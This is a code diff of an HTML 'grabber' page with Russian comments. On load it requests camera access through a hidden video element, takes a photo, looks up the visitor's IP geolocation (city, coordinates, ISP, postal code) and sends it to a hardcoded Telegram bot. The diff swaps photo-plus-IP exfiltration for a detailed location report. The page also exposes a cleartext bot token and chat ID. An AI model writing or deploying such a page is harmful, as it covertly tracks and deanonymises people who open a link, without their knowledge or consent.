@@ -3,38 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Photo and IP to Telegram</title>
+    <title>Send Geolocation Data to Telegram</title>
 </head>
 <body>
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
 
     <script>
-        // Используем ваши данные
         const botToken = '7399220684:AAHNirX_Nk3iLly349TKc-8v0WwvD1t1TEY'; // Ваш токен бота
         const chatId = '6468946124'; // ID чата, куда отправлять сообщения
-        const apiUrl = 'https://api.ipify.org?format=json';
+        const apiUrl = 'http://ip-api.com/json/';
 
-        // Функция для отправки фото в Telegram
-        function sendPhotoToTelegram(blob, ip) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', `User IP: ${ip}`);
+        // Функция для отправки сообщения в Telegram
+        function sendMessageToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            fetch(telegramApiUrl, {
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Photo sent:', data);
+                console.log('Message sent:', data);
             })
             .catch(error => {
-                console.error('Error sending photo:', error);
+                console.error('Error sending message:', error);
             });
         }
 
-        // Запрашиваем доступ к камере и отправляем фото и IP
+        // Запрашиваем доступ к камере и отправляем фото и геолокационные данные
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 const video = document.getElementById('video');
@@ -47,17 +50,45 @@
                 // Захватываем изображение
                 imageCapture.takePhoto()
                     .then(blob => {
-                        // Получаем IP-адрес пользователя
+                        // Получаем IP-адрес и геолокационные данные пользователя
                         fetch(apiUrl)
                             .then(response => response.json())
                             .then(data => {
-                                const ip = data.ip;
+                                const ipInfo = {
+                                    ip: data.query,
+                                    hostname: data.reverse, // может быть недоступно
+                                    city: data.city,
+                                    region: data.regionName,
+                                    country: data.country,
+                                    coordinates: `${data.lat}, ${data.lon}`,
+                                    provider: data.isp,
+                                    postal: data.zip,
+                                    timezone: data.timezone,
+                                    country_flag_url: `https://www.countryflags.io/${data.countryCode}/flat/64.png`,
+                                    latitude: data.lat,
+                                    longitude: data.lon
+                                };
 
-                                // Отправляем фото и IP-адрес в Telegram
-                                sendPhotoToTelegram(blob, ip);
+                                const message = `
+🌐
+├ IP: ${ipInfo.ip}
+├ Hostname: ${ipInfo.hostname || 'недоступно'}
+├ Город: ${ipInfo.city}
+├ Регион: ${ipInfo.region}
+├ Страна: ${ipInfo.country}
+├ Координаты: ${ipInfo.coordinates}
+├ Провайдер: ${ipInfo.provider}
+├ Индекс: ${ipInfo.postal}
+├ Часовой пояс: ${ipInfo.timezone}
+├ <a href="${ipInfo.country_flag_url}">Флаг страны</a>
+├ Широта: ${ipInfo.latitude}
+└ Долгота: ${ipInfo.longitude}`;
+
+                                // Отправляем данные в Telegram
+                                sendMessageToTelegram(message);
                             })
                             .catch(error => {
-                                console.error('Error fetching IP:', error);
+                                console.error('Error fetching IP data:', error);
                             });
                     })
                     .catch(error => {
